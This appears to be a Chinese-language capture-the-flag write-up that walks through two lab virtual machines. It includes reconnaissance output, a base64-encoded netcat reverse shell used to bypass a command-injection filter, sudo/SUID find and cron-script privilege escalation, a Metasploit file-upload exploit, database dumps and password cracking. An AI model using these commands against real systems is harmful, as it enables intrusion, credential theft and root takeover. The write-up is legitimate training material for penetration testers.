78:2b:f7:57:bf:da:fd:ec:e0:d5:60:c4:8b:53:62:fd (RSA)| 256 36:82:4a:8b:71:f7:78:da:49:42:f9:88:6d:26:73:6a (ECDSA)|_ 256 dc:18:8e:b3:36:53:cb:10:34:98:57:3d:f0:a1:2b:ad (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).MAC Address: 08:00:27:59:63:EF (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 18.412 days (since Sun Mar 8 03:06:40 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 尝试爆破80端口下的Web路径 dirb http://192.168.31.196/ -w 1234---- Scanning URL: http:&#x2F;&#x2F;192.168.31.196&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.196&#x2F;admin (CODE:200|SIZE:417) + http:&#x2F;&#x2F;192.168.31.196&#x2F;index.php (CODE:200|SIZE:201) + http:&#x2F;&#x2F;192.168.31.196&#x2F;server-status (CODE:403|SIZE:279) 访问/index.php 显示Fake Admin Area 任意提交查询则回显Fake ping executed 访问/admin 有四个图片文件 源代码中有提示信息passphrase:harder 漏洞利用 使用steghide工具进行分析 发现图片文件haclabs.jpeg存在隐写 123456steghide extract -sf haclabs.jpeg -p harder wrote extracted data to &quot;imp.txt&quot;.cat imp.txt c3VwZXJhZG1pbi5waHA&#x3D;echo &quot;c3VwZXJhZG1pbi5waHA&#x3D;&quot; | base64 -d superadmin.php 访问/superadmin.php 存在ping功能 尝试进行命令注入 1234567891011121314151617181920212223| cat superadmin.php&lt;?php if (isset($_POST[&#39;submitt&#39;]))&#123; $word&#x3D;array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;&#x2F;&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;); $pinged&#x3D;$_POST[&#39;pinger&#39;]; $newStr &#x3D; str_replace($word, &quot;&quot;, $pinged); if(strcmp($pinged, $newStr) &#x3D;&#x3D; 0) &#123; $flag&#x3D;1; &#125; else &#123; $flag&#x3D;0; &#125;&#125;if ($flag&#x3D;&#x3D;1)&#123;$outer&#x3D;shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;$outer&quot;;&#125;?&gt; 有两种获取shell的方法 使用wget下载php一句话木马 使用nc反弹shell 过滤可以使用base64编码进行绕过 |echo &quot;xxxx&quot;|base64 -d|bash xxxx即为要执行的命令的base64编码的结果 wget 写入文件失败，可能没有权限 nc 监听端口 1nc -lvnp 9900 构造payload 12echo &quot;nc.traditional -e &#x2F;bin&#x2F;bash 192.168.31.10 9900&quot; | base64 bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D; 执行命令 1|echo &quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;&quot;|base64 -d|bash 接收到反弹shell 权限提升 获取pty 1python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 在yash的home目录发现flag1 12cat &#x2F;home&#x2F;yash&#x2F;flag1.txtDue to some security issues,I have saved haclabs password in a hidden file. 搜索拥有者为yash的文件/文件夹 123456789101112131415find &#x2F; -user yash 2&gt; &#x2F;dev&#x2F;null&#x2F;home&#x2F;yash&#x2F;home&#x2F;yash&#x2F;flag1.txt&#x2F;home&#x2F;yash&#x2F;.bashrc&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;motd.legal-displayed&#x2F;home&#x2F;yash&#x2F;.profile&#x2F;home&#x2F;yash&#x2F;.bash_history&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;private-keys-v1.d&#x2F;home&#x2F;yash&#x2F;.local&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;nano&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd 12cat &#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwdhaclabs1234 切换账户 12su haclabshaclabs1234 查看sudo权限 12345678sudo -lMatching Defaults entries for haclabs on haclabs: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser haclabs may run the following commands on haclabs: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find 可以使用find命令进行提权 1234567sudo -u root find &#x2F;etc&#x2F;passwd -exec passwd root \\;hackforfunhackforfunsu roothackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) SUID-find 其实在www-data权限时就可以使用find命令进行操作 查看SUID 123find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;find 可以通过find命令来进行读取 12345678910111213find &#x2F;etc&#x2F;passwd -exec ls -la &#x2F;root \\;total 40drwx------ 6 root root 4096 Feb 15 16:28 .drwxr-xr-x 25 root root 4096 Mar 26 17:07 ..-rw------- 1 root root 41 Mar 26 17:22 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Jan 30 06:53 .cachedrwx------ 5 root root 4096 Jan 30 03:06 .configdrwx------ 3 root root 4096 Jan 27 16:46 .gnupgdrwxr-xr-x 3 root root 4096 Jan 27 16:56 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 97 Jan 30 04:29 flag3.txt 12345678910find &#x2F;etc&#x2F;passwd -exec cat &#x2F;root&#x2F;flag3.txt \\;Congrats!!!You completed the challenege! () () \\ &#x2F; ---------- 但是通过find来命令执行时存在限制的，并不是完全以root账户的身份去执行 在本地测试之后得出如下结论 123读取：***写入：**2执行：**4(bash); 1**, *1*, **1(exec) *** 分别代表权限的三位，其中*为通配，表示任意权限 **2， linux中的权限可以线性叠加，**2即代表需要仅写权限，在**3, **6, **7的情况下也是适用的 bash意为该文件作为bash的参数来执行(bash run.sh)，exec则表示作为可执行程序来执行(./run.sh) 由此看来应当是继承了root的r-x权限，但是直接获取bash则还是以原用户的身份来获取，并不能获取root权限的bash；也不能通过passwd来修改root账户的密码(即使euid=0) nc.traditional/nc nc.traditional是最早的版本(v1.10-41.1)，该版本具有-e的选项，用于反弹shell十分方便 ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有-e的选项，无法用于反弹shell ncat的版本则比较新，集成于nmap中 参考资料 exec WP nc TBBT-FunWithFlags 2020/03/31 13:24:54 靶机未启用DHCP，故使用了默认的静态IP:192.168.1.105。若本机网段不是192.168.1.*，需要在VB中创建一个192.168.1.*网段的Host-Only Ethernet Adapter 端口扫描 nmap -p 1-65535 -A -sV -T5 -n -v 192.168.1.105 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879Nmap scan report for 192.168.1.105Host is up (0.00047s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 539 Mar 04 01:11 Welcome.txt| -rw-r--r-- 1 ftp ftp 114 Mar 04 01:13 ftp_agreement.txt|_drwxr-xr-x 9 ftp ftp 4096 Mar 04 01:09 pub| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.1.3| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)| 256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)|_ 256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 4 disallowed entries |_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Fun with flags!1337&#x2F;tcp open waste?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: |_ FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :SF-Port1337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;31%Time&#x3D;5E82D546%P&#x3D;x86_64-pc-linux-gnu%r(NUSF:LL,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(GenericLineSF:s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(GetRequest,2SF:F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(HTTPOptions,2F,SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(RTSPRequest,2F,&quot;FSF:LAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(RPCCheck,2F,&quot;FLAG-sSF:heldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(DNSVersionBindReqTCP,2F,SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(DNSStatusRequestTSF:CP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(Help,2F,&quot;FLSF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(SSLSessionReq,2F,&quot;FLSF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(TerminalServerCookieSF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(TLSSessionReqSF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(Kerberos,2F,&quot;SF:FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(SMBProgNeg,2F,&quot;FLASF:G-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(X11Probe,2F,&quot;FLAG-sheSF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(FourOhFourRequest,2F,&quot;FLAGSF:-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LPDString,2F,&quot;FLAG-sheSF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LDAPSearchReq,2F,&quot;FLAG-sheSF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LDAPBindReq,2F,&quot;FLAG-sheldSF:on&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(SIPOptions,2F,&quot;FLAG-sheldon&#123;SF:cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LANDesk-RC,2F,&quot;FLAG-sheldon&#123;cf8SF:8b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(TerminalServer,2F,&quot;FLAG-sheldon&#123;cfSF:88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(NCP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb1SF:0c4005c1f2781a069cf8&#125;\\n&quot;)%r(NotesRPC,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c400SF:5c1f2781a069cf8&#125;\\n&quot;)%r(JavaRMI,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f27SF:81a069cf8&#125;\\n&quot;)%r(WMSRequest,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781aSF:069cf8&#125;\\n&quot;)%r(oracle-tns,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069SF:cf8&#125;\\n&quot;)%r(ms-sql-s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\SF:n&quot;)%r(afp,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(giopSF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;);MAC Address: 08:00:27:F7:18:EC (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.012 days (since Tue Mar 31 01:13:02 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel nmap在扫描结果中就给出了FLAG-sheldon 实际上使用nc就能获得flag 123nc 192.168.1.105 1337FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125; FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125; nmap在扫描时给出了80端口上robots.txt的相关信息 12http-robots.txt: 4 disallowed entries |_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt 测试之后发现只有/howard可以访问 Web路径枚举 尝试爆破80端口下的Web路径 dirb http://192.168.1.105/ -w 12345678910---- Scanning URL: http:&#x2F;&#x2F;192.168.1.105&#x2F; ----+ http:&#x2F;&#x2F;192.168.1.105&#x2F;index.html (CODE:200|SIZE:239) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;javascript&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;phpmyadmin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;private&#x2F; + http:&#x2F;&#x2F;192.168.1.105&#x2F;robots.txt (CODE:200|SIZE:112) + http:&#x2F;&#x2F;192.168.1.105&#x2F;server-status (CODE:403|SIZE:301)&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F; 可以看到存在phpmyadmin框架和wordpress框架 访问/private，看起来像是一个自建的站点 尝试后发现/private/login.php，可以尝试SQL注入或者收集信息再进行登入爆破 访问/howard /howard/stolen_data/pennys_lastname.txt中记录内容为ERROR 404 ##0x02 威胁建模## 21端口上的FTP允许anonymous账户登入，可能能够获取一些敏感信息 需要先收集一定的信息才能对SSH服务进行登录爆破 80端口上的存在/private, /music/wordpress, /phpmyadmin这三个站点，其中/private/login.php为登入处，可以考虑SQL注入漏洞挖掘或者密码爆破，/music/wordpress可以用wpscan进行深入信息收集 漏洞利用 使用wpscan对wordpress站点进行扫描 wpscan --url http://192.168.1.105/music/wordpress -e u 123456789101112131415161718[i] User(s) Identified:[+] footprintsonthemoon | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] kripke | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] stuart | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 得到三个账户的用户名 123456789101112wpscan --url http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress -e ap[+] reflex-gallery | Location: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F; | Last Updated: 2019-05-10T16:05:00.000Z | [!] The version is out of date, the latest version is 3.1.7 | | Found By: Urls In Homepage (Passive Detection) | | Version: 3.1.3 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;readme.txt 得到插件信息 搜索插件相关信息 12345678910searchsploit reflex gallery--------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)--------------------------------------------------------------------- ----------------------------------------WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) | exploits&#x2F;php&#x2F;remote&#x2F;36809.rbWordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload | exploits&#x2F;php&#x2F;webapps&#x2F;36374.txt--------------------------------------------------------------------- ----------------------------------------Shellcodes: No Result 在MSF中搜索相关EXP 12345678search reflexMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload 2012-12-30 excellent Yes Wordpress Reflex Gallery Upload Vulnerability 使用EXP 1234use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_uploadset RHOSTS 192.168.1.105set TARGETURI &#x2F;music&#x2F;wordpressrun 成功获取Shell 权限提升 FLAG-raz 获取tty 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 查看wordpress的数据库配置文件 12345678cat &#x2F;var&#x2F;www&#x2F;html&#x2F;music&#x2F;wordpress&#x2F;wp-config.php | grep -i dbdefine( &#39;DB_NAME&#39;, &#39;footprintsonthemoon&#39; );define( &#39;DB_USER&#39;, &#39;footprintsonthemoon&#39; );define( &#39;DB_PASSWORD&#39;, &#39;footprintsonthemoon1337&#39; );define( &#39;DB_HOST&#39;, &#39;localhost&#39; );define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );define( &#39;DB_COLLATE&#39;, &#39;&#39; ); 连接数据库 mysql -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 footprintsonthemoon 查看数据库 12345678show databases;+---------------------+| Database |+---------------------+| information_schema || footprintsonthemoon |+---------------------+2 rows in set (0.00 sec) 退出mysql并导出数据库 12exitmysqldump -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 --databases footprintsonthemoon &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;dump.sql 在Kali中下载备份 1curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;dump.sql 查找flag 123cat dump.sql | grep &quot;FLAG&quot; --color&#x3D;autoFLAG-raz&#123;40d17a74e28a62eac2df19e206f0987c&#125; 这里导出的数据在Kali中用grep节选时如果没有用高亮就很难找 FLAG-bernadette 查看/private站点的数据库配置文件 12345cat &#x2F;var&#x2F;www&#x2F;html&#x2F;private&#x2F;db_config.php | grep -i db$DBUSER &#x3D; &#39;bigpharmacorp&#39;;$DBPASS &#x3D; &#39;weareevil&#39;;$con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,$DBUSER,$DBPASS,&quot;bigpharmacorp&quot;); 连接数据库 mysql -h localhost -u bigpharmacorp -pweareevil 查找flag 1234567891011121314151617181920212223242526272829303132show databases;+--------------------+| Database |+--------------------+| information_schema || bigpharmacorp |+--------------------+2 rows in set (0.00 sec)use bigpharmacorp；show tables;+-------------------------+| Tables_in_bigpharmacorp |+-------------------------+| products || users |+-------------------------+2 rows in set (0.00 sec)select * from users;+----+------------+----------------------------------+------------+---------------------------------------------------+| id | username | password | fname | description |+----+------------+----------------------------------+------------+---------------------------------------------------+| 1 | admin | 3fc0a7acf087f549ac2b266baf94b8b1 | josh | Dont mess with me || 2 | bobby | 8cb1fb4a98b9c43b7ef208d624718778 | bob | I like playing football. || 3 | penny69 | cafa13076bb64e7f8bd480060f6b2332 | penny | Hi I am Penny I am new here!! &lt;3 || 4 | mitsos1981 | 05d51709b81b7e0f1a9b6b4b8273b217 | dimitris | Opa re malaka! || 5 | alicelove | e146ec4ce165061919f887b70f49bf4b | alice | Eat Pray Love || 6 | bernadette | dc5ab2b32d9d78045215922409541ed7 | bernadette | FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; |+----+------------+----------------------------------+------------+---------------------------------------------------+6 rows in set (0.00 sec) FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; FLAG-amy 收集信息 123456789101112ls -l &#x2F;home&#x2F;amy&#x2F;total 12-rwxrwxrwx 1 amy amy 434 Mar 4 16:30 notes.txt-rwxr-xr-x 1 amy amy 7488 Mar 6 00:06 secretdiarycat &#x2F;home&#x2F;amy&#x2F;notes.txtThis is my secret diary.The safest way to keep my secrets is inside a compiled executable program.As soon as I get popular now, that I have friends, I will start adding my secrets here.I have used a really strong password that it cant be bruteforced.Seriously it is 18 digit, alphanumeric, uppercase&#x2F;lowercase with symbols.And since my program is already compiled, no one can read the source code in order to view the password! 可以判断/home/amy/secretdiary是一个可执行程序 使用strings命令查看 123456strings secretdiaryP@SSw0rd123Sh3ld0nLogin Success!Soon I will be adding my secrets here..FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125; FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125; FLAG-penny 收集信息 1234567891011121314ls -la &#x2F;home&#x2F;pennytotal 36drwxr-xr-x 4 penny penny 4096 Mar 6 00:37 .drwxr-xr-x 10 root root 4096 Mar 4 02:33 ..-rw-rw-r-- 1 penny penny 61 Mar 5 00:26 .FLAG.penny.txt-rw------- 1 penny penny 57 Mar 6 00:47 .bash_history-rw-r--r-- 1 penny penny 220 Sep 1 2015 .bash_logout-rw-r--r-- 1 penny penny 3771 Sep 1 2015 .bashrcdrwx------ 2 penny penny 4096 Mar 6 00:37 .cachedrwxrwxr-x 2 penny penny 4096 Mar 5 00:26 .nano-rw-r--r-- 1 penny penny 655 May 16 2017 .profilecat &#x2F;home&#x2F;penny&#x2F;.FLAG.penny.txtRkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D; base64 decode 12echo &quot;RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;&quot; | base64 -dFLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125; FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125; FLAG-howard 将FTP根目录打包 1zip -r &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp.zip &#x2F;var&#x2F;ftp 在Kali下载并解压 12curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;ftp.zipunzip ftp.zip 收集信息 123456789ls -l var&#x2F;ftp&#x2F;pub&#x2F;howardtotal 36-rw-r--r-- 1 root root 273 Mar 3 17:05 note.txt-rw-r--r-- 1 root root 30762 Mar 5 19:29 super_secret_nasa_stuff_here.zipcat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;note.txtPlease go away, nothing interesing here. I just had to temporary store some nasa data herebecause my laptop had a virus from some weird websites I visited ... anyway ...And don&#39;t bother looking at my secret data I have encrypted them pretty well. I am an MIT engineer! 爆破压缩包 123456fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u super_secret_nasa_stuff_here.zipPASSWORD FOUND!!!!: pw &#x3D;&#x3D; astronautunzip -P astronaut super_secret_nasa_stuff_here.zipArchive: super_secret_nasa_stuff_here.zip inflating: marsroversketch.jpg 隐写爆破 123456789pip3 install stegcrackerstegcracker var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txtSuccessfully cracked file with password: iloveyoumomTried 51349 passwordsYour file has been written to: var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.outcat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.outFLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125; FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125; FLAG-leonard 查看计划任务 123456789101112131415161718cat &#x2F;etc&#x2F;crontab# &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# m h dom mon dow user command17 * * * * root cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6 * * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6 * * 7 root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 6 1 * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )*&#x2F;1 * * * * root &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.py# 查看文件/home/leonard/thermostat_set_temp.py 123ls -l &#x2F;home&#x2F;leonardtotal 4-rwxrwxrwx 1 root root 42 Mar 30 15:52 thermostat_set_temp.sh 计划任务里写的是.py，但这里是.sh? 文件可写，可以写入反弹bash命令 1echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;9990 0&gt;&amp;1&quot; &gt; &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.sh 本地监听9990端口 1234567891011nc -lvnp 9990Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::9990Ncat: Listening on 0.0.0.0:9990Ncat: Connection from 192.168.1.105.Ncat: Connection from 192.168.1.105:42922.bash: cannot set terminal process group (2108): Inappropriate ioctl for devicebash: no job control in this shellid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 查看flag 12cat FLAG-leonard.txtFLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125; FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125; /etc/crontab 由于之前一直没有接触到计划任务的提权方法，在操作过程中便没有想到这一点 其原理大概与SUID差不多，低权用户以高权用户的身份执行命令 grep高亮 在grep节选flag时，出现了回显，便说明存在&quot;FLAG&quot;字样，但是由于字符太多、太密，难以寻找flag 个人操作时直接将文本拷贝至windows的notepad++中，然后Ctrl+F查找 后来想到grep可以高亮文本，加上参数--color=auto即可 搜点 或许用信息扫荡来描述这一行为更合适 当时个人状态不佳，没有仔细思考就用ftp客户端连上服务器，然后用get命令一个一个地下载文件 后来发现还是漏了一些比较重要的信息 